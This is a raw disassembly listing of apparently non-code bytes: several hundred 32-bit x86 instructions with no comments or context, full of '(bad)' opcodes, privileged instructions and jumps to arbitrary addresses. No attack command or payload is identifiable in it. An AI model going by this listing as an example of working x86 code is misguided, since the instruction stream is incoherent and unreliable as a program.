  410eab:	pop    ecx
  410eac:	ins    BYTE PTR es:[edi],dx
  410ead:	lock jbe 0x410f27
  410eb0:	int3   
  410eb1:	jb     0x410e9b
  410eb3:	dec    ecx
  410eb4:	leave  
  410eb5:	push   ebx
  410eb6:	sbb    al,dl
  410eb8:	mov    ds:0x34086a1b,al
  410ebd:	pushf  
  410ebe:	lods   al,BYTE PTR ds:[esi]
  410ebf:	sub    ch,dh
  410ec1:	add    DWORD PTR [esi-0x7ede5a38],eax
  410ec7:	fadd   DWORD PTR [ecx]
  410ec9:	mov    dl,0xb6
  410ecb:	adc    al,0xdd
  410ecd:	push   0xd66c0486
  410ed2:	cmp    ebx,ecx
  410ed4:	call   FWORD PTR [edx-0x3d]
  410ed7:	vpacksswb ymm6,ymm2,YMMWORD PTR [edx]
  410edb:	jl     0x410e76
  410edd:	adc    dh,BYTE PTR [esi-0x72e5ae52]
  410ee3:	jb     0x410ecb
  410ee5:	aas    
  410ee6:	sbb    esi,ebp
  410ee8:	pop    es
  410ee9:	dec    edx
  410eea:	sbb    ah,ah
  410eec:	retf   
  410eed:	iret   
  410eee:	daa    
  410eef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef0:	or     al,0xc
  410ef2:	mov    es:0xf4d69f53,eax
  410ef8:	xlat   BYTE PTR ds:[ebx]
  410ef9:	adc    al,0x6a
  410efb:	stos   DWORD PTR es:[edi],eax
  410efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410efd:	sahf   
  410efe:	jmp    0xff9d4f1d
  410f03:	mov    ch,0x23
  410f05:	cmp    ebp,esp
  410f07:	push   esp
  410f08:	add    ah,BYTE PTR [eax+0xb]
  410f0b:	out    0x7,eax
  410f0d:	push   0xa3ca75e2
  410f12:	dec    eax
  410f13:	xor    BYTE PTR [eax+0x63ac7e7c],dl
  410f19:	fwait
  410f1a:	and    al,BYTE PTR [ecx-0x54]
  410f1d:	rcr    DWORD PTR [ecx-0x3f],cl
  410f20:	jo     0x410f1a
  410f22:	icebp  
  410f23:	jl     0x410f5a
  410f25:	xor    ah,BYTE PTR [edi-0x39aecd40]
  410f2b:	push   esp
  410f2c:	inc    ebx
  410f2d:	ror    DWORD PTR [ecx],cl
  410f2f:	gs pop ebp
  410f31:	xor    eax,0xd47412d
  410f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f37:	repz mov cl,0x65
  410f3a:	jecxz  0x410ef7
  410f3c:	dec    ecx
  410f3d:	xlat   BYTE PTR ds:[ebx]
  410f3e:	lea    esp,[edx]
  410f40:	mov    edi,0xd3a1bb06
  410f45:	sub    esi,DWORD PTR [edx]
  410f47:	pop    edx
  410f48:	out    dx,eax
  410f49:	lock test eax,0x9b65134f
  410f4f:	dec    ebp
  410f50:	add    cl,BYTE PTR [eax+0x6f]
  410f53:	pop    ecx
  410f54:	pop    edx
  410f55:	bsr    ecx,DWORD PTR [ebp+0x11]
  410f59:	xor    eax,edx
  410f5b:	jo     0x410f3f
  410f5d:	xor    esp,DWORD PTR [edx+ebp*8-0x12]
  410f61:	add    bl,BYTE PTR [edx]
  410f63:	loop   0x410fab
  410f65:	jae    0x410fd9
  410f67:	popf   
  410f68:	xchg   edx,eax
  410f69:	or     edx,ebx
  410f6b:	push   0x59f327fb
  410f70:	dec    edi
  410f71:	or     BYTE PTR [esi],bl
  410f73:	adc    BYTE PTR [esi+0x230b1393],ch
  410f79:	retf   
  410f7a:	and    eax,0xd3e0836b
  410f7f:	xor    al,0xc7
  410f81:	(bad)  
  410f82:	jae    0x410f7c
  410f84:	xadd   BYTE PTR [edx-0x7001d843],dh
  410f8b:	xchg   ecx,eax
  410f8c:	cmp    BYTE PTR [eax],bl
  410f8e:	clc    
  410f8f:	jne    0x410faf
  410f91:	cld    
  410f92:	nop
  410f93:	and    al,0x93
  410f95:	iret   
  410f96:	or     BYTE PTR [ebx-0x69],ch
  410f99:	jmp    0xff01:0x7a751345
  410fa0:	imul   ebx,DWORD PTR [esi],0xffffff93
  410fa3:	test   al,0xe0
  410fa5:	push   0x75ca0774
  410faa:	idiv   DWORD PTR [ebx+ebp*1-0x690e7386]
  410fb1:	(bad)  
  410fb2:	or     BYTE PTR [esi-0x5b],ah
  410fb5:	ds mov dl,BYTE PTR fs:0x419991d
  410fbd:	push   esi
  410fbe:	icebp  
  410fbf:	xchg   ebx,eax
  410fc0:	add    DWORD PTR [edi+0x3ed519c9],esp
  410fc6:	imul   edi,DWORD PTR ds:0xda0b6b8d,0x28fe1d81
  410fd0:	xor    edx,DWORD PTR [edx-0x53]
  410fd3:	mov    cs,WORD PTR ds:[ebx-0x51bbbdd4]
  410fda:	sub    al,0x62
  410fdc:	xchg   esp,eax
  410fdd:	mov    ebx,0x43ef1e21
  410fe2:	jne    0x410fdf
  410fe4:	xchg   BYTE PTR [edi+eiz*2+0x18d1bef2],al
  410feb:	add    dl,BYTE PTR [ebx+ebx*2+0x4bd711d7]
  410ff2:	and    al,BYTE PTR [edi+0x34]
  410ff5:	inc    edx
  410ff6:	neg    DWORD PTR [edi-0x2077fa18]
  410ffc:	test   esi,ebp
  410ffe:	in     al,dx
  410fff:	(bad)  
  411000:	dec    esi
  411001:	stc    
  411002:	and    eax,0xf18b9eb0
  411007:	cmp    dl,BYTE PTR [esi-0x68]
  41100a:	hlt    
  41100b:	xchg   DWORD PTR ds:0xa48b6edf,edi
  411011:	div    BYTE PTR [ecx-0x72597a9d]
  411017:	mov    ebp,0xe51789c9
  41101c:	xchg   DWORD PTR [ecx+0x4d79642d],ebp
  411022:	sbb    al,0xad
  411024:	les    esp,FWORD PTR [eax]
  411026:	in     al,dx
  411027:	stc    
  411028:	fs and cl,bl
  41102b:	xchg   ecx,eax
  41102c:	aas    
  41102d:	or     eax,0x19740881
  411032:	pop    ds
  411033:	aad    0x2d
  411035:	nop
  411036:	cs pop ss
  411038:	(bad)  
  411039:	mov    ds:0x9201c3bc,al
  41103e:	mov    esp,0xc32740e5
  411043:	push   ebp
  411044:	xchg   ebx,eax
  411045:	sbb    eax,DWORD PTR [eax+0x54]
  411048:	add    edx,edi
  41104a:	test   DWORD PTR [edx],esi
  41104c:	jae    0x410fe0
  41104e:	add    DWORD PTR [edx],esp
  411050:	test   BYTE PTR [esi+0x2a07df40],0xf1
  411057:	pop    DWORD PTR [ebx-0xb]
  41105a:	cmp    DWORD PTR [eax],esp
  41105c:	cld    
  41105d:	sub    DWORD PTR [ecx],0xffffff9b
  411060:	mov    ebx,0xb5e30000
  411065:	int    0x3c
  411067:	(bad)
  41106a:	bound  ebx,QWORD PTR [ecx]
  41106c:	(bad)  
  41106d:	mov    eax,0xe1bf7426
  411072:	test   DWORD PTR [edx+0x68450aa7],eax
  411078:	and    eax,0xbbd38611
  41107d:	mov    WORD PTR [edi],cs
  41107f:	jae    0x41108b
  411081:	jge    0x411010
  411083:	push   0x6c
  411085:	(bad)  
  411086:	xor    esi,edx
  411088:	nop
  411089:	(bad)  
  41108a:	mov    al,0x7
  41108c:	retf   
  41108d:	sbb    dl,BYTE PTR ds:0x1dfc4d9
  411093:	sub    ch,BYTE PTR [ecx-0x39]
  411096:	inc    ecx
  411097:	shl    BYTE PTR [ebp-0x2f],cl
  41109a:	sbb    edi,edx
  41109c:	xor    cl,0x3e
  41109f:	push   es
  4110a0:	(bad)  
  4110a1:	out    0x38,eax
  4110a3:	pop    ds
  4110a4:	add    eax,0x74d8b218
  4110a9:	shr    DWORD PTR [esi+0x6470e846],cl
  4110af:	jb     0x411050
  4110b1:	xlat   BYTE PTR ds:[ebx]
  4110b2:	mov    ecx,0x69fd8016
  4110b7:	xchg   edi,eax
  4110b8:	xlat   BYTE PTR ds:[ebx]
  4110b9:	inc    esp
  4110ba:	jns    0x4110e6
  4110bc:	shr    cl,0xec
  4110bf:	dec    eax
  4110c0:	fisub  DWORD PTR [eax+0x3a65a624]
  4110c6:	loope  0x41110a
  4110c8:	les    edx,FWORD PTR [esp+ebp*1+0x766e7bfd]
  4110cf:	jmp    0x3d3be667
  4110d4:	out    dx,eax
  4110d5:	leave  
  4110d6:	mov    dl,0x92
  4110d8:	push   ss
  4110d9:	jo     0x411131
  4110db:	mov    cl,0xa3
  4110dd:	cmc    
  4110de:	ins    BYTE PTR es:[edi],dx
  4110df:	xchg   edx,eax
  4110e0:	enter  0x9f84,0x7c
  4110e4:	mov    dh,0x40
  4110e6:	in     eax,0x96
  4110e8:	sub    eax,0x90118f7
  4110ed:	inc    esi
  4110ee:	cmp    al,0xa
  4110f0:	mov    esi,0x6e6cf5cb
  4110f5:	fidiv  DWORD PTR [ecx+0x17904ee3]
  4110fb:	pop    ds
  4110fc:	sub    al,al
  4110fe:	data16 cmp BYTE PTR [esi+0x39],al
  411102:	mov    ecx,0x18bbc08a
  411108:	addr16 inc eax
  41110a:	cmp    ecx,DWORD PTR [eax+eiz*1+0x2c3cf577]
  411111:	xor    ebp,DWORD PTR [ecx-0x5d]
  411114:	and    esi,0x7e94719a
  41111a:	mov    ecx,0xbe14d507
  41111f:	push   esp
  411120:	mov    cl,0x57
  411122:	pop    ss
  411123:	cmp    DWORD PTR [esi+ebp*4-0x33],ebx
  411127:	add    al,0xd3
  411129:	sbb    edx,0x263dfc78
  41112f:	xor    DWORD PTR [edi+0x30],eax
  411132:	shl    BYTE PTR [ecx+0x19],cl
  411135:	sbb    ebp,0xef012ba0
  41113b:	and    al,0x2
  41113d:	jl     0x41110f
  41113f:	addr16 mov dh,0xbf
  411142:	mov    eax,ds:0xa9f045b6
  411147:	leave  
  411148:	mov    BYTE PTR [edi-0x4afa73b6],cl
  41114e:	sub    DWORD PTR [eax],edi
  411150:	clc    
  411151:	dec    ebp
  411152:	push   edi
  411153:	xchg   ebx,eax
  411154:	fisub  DWORD PTR ds:0x9c073b24
  41115a:	xlat   BYTE PTR ds:[ebx]
  41115b:	sub    al,0xfc
  41115d:	mov    dl,BYTE PTR [edx+0x21]
  411160:	inc    ebp
  411161:	das    
  411162:	hlt    
  411163:	mov    ecx,0xd2ad7114
  411168:	rcl    BYTE PTR [ebx-0x35bc3368],cl
  41116e:	daa    
  41116f:	xlat   BYTE PTR ds:[ebx]
  411170:	jae    0x4111c2
  411172:	call   FWORD PTR [edx+0x26d5cf6b]
  411178:	pop    ecx
  411179:	xor    DWORD PTR [eax-0x145ac154],ebx
  41117f:	pop    edx
  411180:	dec    ch
  411182:	mov    BYTE PTR [eax+0xd],cl
  411185:	dec    edi
  411186:	xor    DWORD PTR [esi+0xd21e89a],esp
  41118c:	lods   eax,DWORD PTR ds:[esi]
  41118d:	adc    eax,0xa06e9e15
  411192:	or     eax,0xc5dade01
  411197:	sub    DWORD PTR [ecx-0x3c],0x95f2060f
  41119e:	in     eax,dx
  41119f:	test   BYTE PTR [esp+eax*8],ah
  4111a2:	dec    ebx
  4111a3:	test   BYTE PTR [esi-0x5f],cl
  4111a6:	pop    esi
  4111a7:	mov    ebp,0x564b87a9
  4111ac:	xor    BYTE PTR [edx+0x6166234a],al
  4111b2:	jecxz  0x4111e1
  4111b4:	mov    edx,0x251ea535
  4111b9:	push   ebp
  4111ba:	mov    ebp,0x91b99fa6
  4111bf:	sahf   
  4111c0:	mov    edi,0xa153aced
  4111c5:	jl     0x41122a
  4111c7:	cmp    bl,ch
  4111c9:	mov    WORD PTR [edx],fs
  4111cb:	push   edi
  4111cc:	add    dl,ch
  4111ce:	adc    eax,0x8193fd41
  4111d3:	shl    edi,1
  4111d5:	cdq    
  4111d6:	jmp    0x1876d17c
  4111db:	add    esi,ebp
  4111dd:	xor    eax,0x413a11f9
  4111e2:	int    0xb
  4111e4:	out    dx,eax
  4111e5:	clc    
  4111e6:	adc    DWORD PTR ds:0x7fb1743f,eax
  4111ec:	iret   
  4111ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ee:	test   al,0x6
  4111f0:	push   0x2d5800d2
  4111f5:	fs clc 
  4111f7:	aas    
  4111f8:	mov    ebx,0xb937592b
  4111fd:	cmp    DWORD PTR [edi],edx
  4111ff:	pop    ecx
  411200:	cmp    DWORD PTR [eax],0x63
  411203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411204:	or     eax,ebx
  411206:	mov    esi,0x56b91254
  41120b:	or     bh,ah
  41120d:	or     ebx,ebp
  41120f:	fcmovb st,st(4)
  411211:	xchg   DWORD PTR [edi+0x14],ecx
  411214:	loopne 0x411201
  411216:	sar    BYTE PTR [ecx-0xabc124b],0xad
  41121d:	adc    DWORD PTR [esi+esi*2],0x1ed0f0fd
  411224:	jbe    0x4112a2
  411226:	push   ds
  411227:	mov    ecx,edx
  411229:	imul   edi,DWORD PTR [ebx+0x593279db],0x76
  411230:	mov    ecx,0x46f8b9a0
  411235:	enter  0x6ba,0xc7
  411239:	and    ecx,DWORD PTR [ebx+0x636b3bf]
  41123f:	jecxz  0x41123d
  411241:	stc    
  411242:	jno    0x41123e
  411244:	lods   eax,DWORD PTR ds:[esi]
  411245:	inc    edi
  411246:	or     eax,0x7f96c217
  41124b:	push   ds
  41124c:	jl     0x41120e
  41124e:	sub    eax,0xa6f392d2
  411253:	adc    al,0xe5
  411255:	mov    ds:0x32249fd,eax
  41125a:	jns    0x4112d1
  41125c:	or     ah,al
  41125e:	mov    DWORD PTR [eax+0x55],ebp
  411261:	sbb    BYTE PTR [eax-0x6e245078],bl
  411267:	push   si
  411269:	xor    eax,esi
  41126b:	mov    ds:0xab4ab848,eax
  411270:	dec    eax
  411271:	xchg   ecx,eax
  411272:	pop    ecx
  411273:	retf   0x2136
  411276:	mov    dl,0x52
  411278:	mov    edi,0x5b213dbd
  41127d:	jo     0x411244
  41127f:	or     bl,BYTE PTR [esi]
  411281:	sub    DWORD PTR [edi+0x47],ebx
  411284:	lods   al,BYTE PTR ds:[esi]
  411285:	push   ebx
  411286:	adc    DWORD PTR [ecx+0x30f37ced],0x623d2702
  411290:	add    al,0xc8
  411292:	and    BYTE PTR [edi-0x2b],ah
  411295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411297:	adc    BYTE PTR [eax+0x1a243925],ch
  41129d:	jae    0x41127b
  41129f:	jl     0x41124a
  4112a1:	jmp    0x411250
  4112a3:	fdivr  DWORD PTR [edi+0x62]
  4112a6:	in     al,0x54
  4112a8:	xor    DWORD PTR [ebx],eax
  4112aa:	pop    esi
  4112ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ac:	mov    ch,0x9e
  4112ae:	outs   dx,BYTE PTR ds:[esi]
  4112af:	push   ebx
  4112b0:	aam    0x36
  4112b2:	xchg   esi,eax
  4112b3:	sbb    edi,DWORD PTR [eax+0x2]
  4112b6:	mov    edi,0x870263a1
  4112bb:	cmp    esp,DWORD PTR [ebp+0x5c]
  4112be:	jb     0x411337
  4112c0:	sbb    cl,BYTE PTR [ebx]
  4112c2:	outs   dx,BYTE PTR ds:[esi]
  4112c3:	mov    ds:0x2751dd40,al
  4112c8:	stos   DWORD PTR es:[edi],eax
  4112c9:	(bad)  
  4112ca:	scas   al,BYTE PTR es:[edi]
  4112cb:	dec    edx
  4112cc:	mov    ebp,0x6ad1f24a
  4112d1:	jnp    0x411351
  4112d3:	xor    eax,0x1408fd99
  4112d8:	(bad)  [ebx]
  4112da:	(bad)  
  4112dc:	mov    dh,0x42
  4112de:	sbb    eax,0x771a9468
  4112e3:	pop    ss
  4112e4:	xlat   BYTE PTR ds:[ebx]
  4112e5:	mov    BYTE PTR [ebx],0x31
  4112e8:	mov    dl,0x19
  4112ea:	pop    esi
  4112eb:	and    DWORD PTR [ecx+eiz*4+0x51],0xffffffda
  4112f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112f1:	push   esi
  4112f2:	mov    edi,0x1a668a74
  4112f7:	dec    ecx
  4112f8:	mov    ds:0x78a1d658,eax
  4112fd:	mov    cs,WORD PTR [ebp-0x6fb1d527]
  411303:	inc    ecx
  411304:	sbb    dh,BYTE PTR [esi]
  411306:	sbb    eax,0xc837a441
  41130b:	mov    eax,0x2a4deefc
  411310:	or     al,0x22
  411312:	(bad)  
  411313:	adc    dl,bl
  411315:	mov    ch,0x83
  411317:	pop    esp
  411318:	inc    edi
  411319:	mov    ebp,0xfeca1583
  41131e:	(bad)  
  41131f:	daa    
  411320:	xchg   BYTE PTR [edx+0x39b64fd4],cl
  411326:	ja     0x4112af
  411328:	mov    ebp,0x68deafd6
  41132d:	or     BYTE PTR [ebx-0x3a9a53ee],dl
  411333:	call   0x41fde53b
  411338:	jge    0x41133f
  41133a:	es inc esp
  41133c:	aas    
  41133d:	out    0x2a,al
  41133f:	(bad)  
  411340:	loope  0x41136d
  411342:	test   eax,edx
  411344:	jo     0x411304
  411346:	add    dl,BYTE PTR ds:0x89cc2ba0
  41134c:	xchg   esp,eax
  41134d:	inc    esi
  41134e:	bound  esp,QWORD PTR [ecx+0x5]
  411351:	test   BYTE PTR [ebx],0x92
  411354:	shr    ecx,1
  411356:	mov    eax,0xff87345c
  41135b:	mov    ah,0x6b
  41135d:	sub    eax,0x24e6c9b0
  411362:	sbb    eax,edx
  411364:	mov    dh,0x2f
  411366:	xchg   edx,eax
  411367:	mov    ecx,0x177f1a43
  41136c:	mov    ss,WORD PTR [ebx+0x6155ee5c]
  411372:	pop    edx
  411373:	xor    BYTE PTR [ebp-0x9ab1235],ch
  411379:	ds lock inc eax
  41137c:	mov    al,0xdc
  41137e:	stos   BYTE PTR es:[edi],al
  41137f:	pop    ds
  411380:	imul   cl
  411382:	xor    DWORD PTR [ecx],0xd870a0c3
  411388:	mov    ah,bh
  41138a:	into   
  41138b:	mov    ds:0xd520dd07,al
  411390:	popf   
  411391:	call   0xf57a9a3f
  411396:	pop    esi
  411397:	lahf   
  411398:	aas    
  411399:	rol    DWORD PTR [eax+eax*1+0xe],0x76
  41139e:	mov    eax,0x60149ebc
  4113a3:	sub    ecx,DWORD PTR [eax]
  4113a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a6:	imul   ebp,eax,0x64
  4113a9:	cmp    DWORD PTR [edi-0x7903e05e],ebp
  4113af:	arpl   WORD PTR [ecx],di
  4113b1:	xchg   esi,eax
  4113b2:	xor    DWORD PTR [esi+eax*1+0x7e65d702],eax
  4113b9:	and    BYTE PTR [esi+0x494ce3c6],0xb1
  4113c0:	add    dh,ch
  4113c2:	xor    ebp,ebx
  4113c4:	(bad)  
  4113c5:	outs   dx,BYTE PTR ds:[esi]
  4113c6:	push   es
  4113c7:	aad    0xb7
  4113c9:	das    
  4113ca:	mov    DWORD PTR [ecx],ecx
  4113cc:	jmp    0x4113de
  4113ce:	mov    DWORD PTR [ebp+0x54bf43d5],ebp
  4113d4:	pop    ebp
  4113d5:	pusha  
  4113d6:	(bad)  
  4113d7:	xchg   ecx,eax
  4113d8:	or     cl,dl
  4113da:	mov    ds:0x7ea8c1bd,eax
  4113df:	mov    ch,0xd7
  4113e1:	push   edi
  4113e2:	cmp    BYTE PTR ds:0x5b388cde,0xb6
  4113e9:	push   edi
  4113ea:	imul   edi,DWORD PTR [ecx-0x445ab99e],0x65781144
  4113f4:	call   0xa8d7:0x348c2aa9
  4113fb:	cwde   
  4113fc:	std    
  4113fd:	mov    ebp,DWORD PTR [edi+0x2]
  411400:	lods   al,BYTE PTR ds:[esi]
  411401:	adc    al,0x66
  411403:	daa    
  411404:	ins    DWORD PTR es:[edi],dx
  411405:	gs dec edi
  411407:	js     0x4113eb
  411409:	fimul  WORD PTR es:[ebp+eiz*2+0x64]
  41140e:	sub    ebp,edx
  411410:	add    edi,ecx
  411412:	rcl    eax,0xd
  411415:	push   cs
  411416:	fldenv [esi+ebp*1+0x7c]
  41141a:	and    al,0x2
  41141c:	dec    ebp
  41141d:	push   esp
  41141e:	or     al,BYTE PTR [edi]
  411420:	(bad)  
  411421:	lock push esp
  411423:	ds jo  0x411408
  411426:	jmp    0xeaddbc6f
  41142b:	push   0xffffff97
  41142d:	retf   0xd971
  411430:	aas    
  411431:	out    0x66,al
  411433:	push   eax
  411434:	stos   DWORD PTR es:[edi],eax
  411435:	dec    edx
  411436:	icebp  
  411437:	in     eax,0x2e
  411439:	test   DWORD PTR [ebx+edi*8],edi
  41143c:	es scas al,BYTE PTR es:[di]
  41143f:	or     eax,0xfddea711
  411444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411445:	ja     0x41144c
  411447:	adc    ebp,DWORD PTR [edi]
  411449:	cmc    
  41144a:	call   0x537c:0xccd4ad51
  411451:	arpl   WORD PTR [ebx],bp
  411453:	shr    esp,0x1d
  411456:	div    DWORD PTR [ecx+0x4a133299]
  41145c:	cdq    
  41145d:	push   0x98ddf483
  411462:	test   eax,0xf8a9a426
  411467:	je     0x41143c
  411469:	xchg   edx,eax
  41146a:	xor    eax,0x14c9870b
  41146f:	mov    ebp,0x1ee6b6a4
  411474:	cmp    al,BYTE PTR [ebx+0x54]
  411477:	lea    edx,[edx-0x5f]
  41147a:	invd   
  41147c:	xchg   esi,eax
  41147d:	jo     0x41140a
  41147f:	and    DWORD PTR [ecx-0x3f],eax
  411482:	push   ebp
  411483:	xor    al,0x18
  411485:	int    0xde
  411487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411488:	gs cmp al,0xa5
  41148b:	loop   0x411483
  41148d:	ds dec edx
  41148f:	retf   
  411490:	out    dx,al
  411491:	not    DWORD PTR [ebp-0x53]
  411494:	scas   al,BYTE PTR es:[edi]
  411495:	dec    edx
  411496:	xchg   BYTE PTR [eax+0x5ac233d],bh
  41149c:	pop    eax
  41149d:	into   
  41149e:	shr    DWORD PTR [ecx+0x69],1
  4114a1:	inc    esi
  4114a2:	inc    ecx
  4114a3:	popa   
  4114a4:	es ret 0xe715
  4114a8:	test   BYTE PTR [eax],al
  4114aa:	ss mov ecx,0x1e4edec4
  4114b0:	dec    edi
  4114b1:	scas   al,BYTE PTR es:[edi]
  4114b2:	jecxz  0x411519
  4114b4:	or     dl,0x48
  4114b7:	ret    
  4114b8:	and    eax,0x7a570ac1
  4114bd:	stos   BYTE PTR es:[edi],al
  4114be:	std    
  4114bf:	aas    
  4114c0:	pop    ebx
  4114c1:	mov    dl,0xae
  4114c3:	mov    esi,0x7109cbea
  4114c8:	inc    edx
  4114c9:	fs push ds
  4114cb:	sub    BYTE PTR [edx],0x2
  4114ce:	ds lock test al,0x7c
  4114d2:	popf   
  4114d3:	dec    ebp
  4114d4:	mov    bl,0x83
  4114d6:	ss jae 0x4114d8
  4114d9:	enter  0x2111,0x8b
  4114dd:	je     0x41154c
  4114df:	push   ebp
  4114e0:	aam    0x7a
  4114e2:	add    ebx,DWORD PTR [edi-0x1c]
  4114e5:	cli    
  4114e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e7:	lea    ecx,[eax-0x4a]
  4114ea:	es jae 0x41152d
  4114ed:	xchg   ebp,eax
  4114ee:	outs   dx,BYTE PTR ds:[esi]
  4114ef:	adc    dl,BYTE PTR [esi+eiz*8]
  4114f2:	xchg   edi,eax
  4114f3:	out    0x35,eax
  4114f5:	push   esp
  4114f6:	jne    0x4114f2
  4114f8:	and    ch,BYTE PTR ds:0xb2111caa
  4114fe:	repz cs pop ss
  411501:	(bad)  
  411502:	pop    esi
  411503:	fstp   DWORD PTR [edi+0x123904e8]
  411509:	add    BYTE PTR [ebx-0x505348f6],bl
  41150f:	add    eax,0x74bd4499
  411514:	mov    bl,0x8
  411516:	ret    
  411517:	aaa    
  411518:	push   ds
  411519:	mov    ah,0xf0
  41151b:	test   ch,ah
  41151d:	and    BYTE PTR [edi+0x22a9aa56],cl
  411523:	std    
  411524:	lds    ecx,FWORD PTR [edx]
  411526:	jmp    DWORD PTR [ebx+esi*2]
  411529:	and    ebp,eax
  41152b:	mov    bh,0xd
  41152d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41152e:	cmp    BYTE PTR [edi-0x15],ah
  411531:	imul   esp,DWORD PTR [ecx],0x49de0731
  411537:	test   eax,0xc54a2ce0
  41153c:	xchg   DWORD PTR [eax],edx
  41153e:	dec    ecx
  41153f:	mov    ds:0xdc197cfa,al
  411544:	inc    eax
  411545:	cmc    
  411546:	dec    edx
  411547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411548:	or     eax,0xb664f58a
  41154d:	adc    bl,0xf
  411550:	call   0x8ffe:0x8c456edb
  411557:	mov    ebp,0xe8795aeb
  41155c:	lea    edi,[ecx+0x22efd8e8]
  411562:	lds    esp,FWORD PTR cs:[ecx+0x7a]
  411566:	adc    eax,0x1355bb6d
  41156b:	ja     0x411558
  41156d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41156e:	js     0x41150b
  411570:	adc    BYTE PTR [ecx+ebx*4+0x2b],ah
  411574:	ds jl  0x41158e
  411577:	emms   
  411579:	sub    al,0x91
  41157b:	pushf  
  41157c:	inc    ebp
  41157d:	fcom   QWORD PTR [ebx+esi*8+0x48]
  411581:	shr    DWORD PTR [ecx],1
  411583:	ins    BYTE PTR es:[edi],dx
  411584:	fwait
  411585:	rcl    DWORD PTR [ecx+0x7576762c],cl
  41158b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41158c:	test   BYTE PTR [ebp+0xb],al
  41158f:	test   DWORD PTR [edi-0x78],ebx
  411592:	and    al,0xf1
  411594:	sbb    eax,0x6835f9bc
  411599:	into   
  41159a:	or     edx,DWORD PTR ds:0xfd1fc0ee
  4115a0:	ret    
  4115a1:	jmp    0x4115ee
  4115a3:	xchg   DWORD PTR [edi-0x244863d1],ecx
  4115a9:	jno    0x411599
  4115ab:	clc    
  4115ac:	or     DWORD PTR [edx+0x246c3c49],edx
  4115b2:	loopne 0x41160e
  4115b4:	sahf   
  4115b5:	lds    ecx,FWORD PTR [ecx-0x3896d394]
  4115bb:	push   edx
  4115bc:	cs call 0x5065:0xe8219d1
  4115c4:	loopne 0x41158e
  4115c6:	sub    al,0x16
  4115c8:	aad    0x42
  4115ca:	aad    0x2f
  4115cc:	and    eax,0x8dc6220
  4115d1:	inc    edi
  4115d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d3:	(bad)  
  4115d4:	mov    ds:0x35d59e6c,eax
  4115d9:	in     al,dx
  4115da:	xlat   BYTE PTR ds:[ebx]
  4115db:	test   eax,0x43b2dae2
  4115e0:	test   al,0x62
  4115e2:	jecxz  0x41163a
  4115e4:	arpl   WORD PTR [ebp-0x5d0633bc],cx
  4115ea:	cmp    BYTE PTR [esp+ebx*4+0x36c099d7],bl
  4115f1:	adc    BYTE PTR [eax+0x1f],bh
  4115f4:	daa    
  4115f5:	fstp   TBYTE PTR [edi-0x9f76fc2]
  4115fb:	repz (bad) 
  4115fd:	std    
  4115fe:	fcmovbe st,st(3)
  411600:	dec    edx
  411601:	xchg   esp,eax
  411602:	mov    ds:0x13b0393c,al
  411607:	test   BYTE PTR [edi-0x2],bh
  41160a:	test   DWORD PTR [edi-0x19],ebp
  41160d:	std    
  41160e:	push   0xffffff93
  411610:	es mov bl,0x7a
  411613:	mov    ebx,0x4a9c700a
  411618:	mov    edi,0x880cd0a
  41161d:	imul   esp,DWORD PTR [eax-0x65],0xfffffff5
  411621:	and    dl,bh
  411623:	sub    esp,edx
  411625:	push   ds
  411626:	pushf  
  411627:	call   0x1bde95c6
  41162c:	fist   WORD PTR [ebx+0x36]
  41162f:	or     ah,cl
  411631:	pop    ds
  411632:	or     al,0xb5
  411634:	in     al,dx
  411635:	pop    ebp
  411636:	aaa    
  411637:	mov    DWORD PTR [esi],edx
  411639:	les    edx,FWORD PTR [ebx]
  41163b:	jno    0x411622
  41163d:	outs   dx,DWORD PTR ds:[esi]
  41163e:	sub    al,BYTE PTR [esi]
  411640:	sub    BYTE PTR [edi+ebx*2-0x3800dfc7],bl
  411647:	lods   eax,DWORD PTR ds:[esi]
  411648:	mov    ds:0x7244a9c6,al
  41164d:	add    edx,DWORD PTR [ebx]
  41164f:	xchg   ebx,eax
  411650:	push   cs
  411651:	cdq    
  411652:	(bad)  
  411653:	neg    DWORD PTR [ecx+0x7a7675e]
  411659:	nop
  41165a:	out    dx,al
  41165b:	mov    ecx,0xd03e78b1
  411660:	or     dh,BYTE PTR [ebx+0x13]
  411663:	push   ebp
  411664:	mov    esp,0x7f58cb8d
  411669:	outs   dx,DWORD PTR ds:[esi]
  41166a:	mov    esp,0x7a019de5
  41166f:	mov    al,0xe2
  411671:	xor    ecx,DWORD PTR [eax]
  411673:	xchg   ebp,eax
  411674:	fisub  WORD PTR [esi+0x30cd8592]
  41167a:	cld    
  41167b:	repnz dec eax
  41167d:	out    dx,al
  41167e:	fwait
  41167f:	retf   0xef7b
  411682:	sub    eax,0xf592050f
  411687:	dec    ecx
  411688:	aas    
  411689:	jge    0x4116d9
  41168b:	push   DWORD PTR [edi-0x866bd07]
  411691:	push   edi
  411692:	mov    ds:0xae05e636,eax
  411697:	mov    bl,0x41
  411699:	sbb    ebp,0xf061466c
  41169f:	xor    ch,dl
  4116a1:	mov    eax,0xdfbb5128
  4116a6:	in     al,0xae
  4116a8:	sub    dh,BYTE PTR [edx+0x18]
  4116ab:	sahf   
  4116ac:	out    0x67,al
  4116ae:	push   es
  4116af:	gs mov edi,0x9e020269
  4116b5:	sbb    esi,DWORD PTR [edx-0x33]
  4116b8:	(bad)  
  4116b9:	pushf  
  4116ba:	lods   eax,DWORD PTR ds:[esi]
  4116bb:	mov    WORD PTR [ebp-0x76bb9620],cs
  4116c1:	pop    esp
  4116c2:	jae    0x4116e5
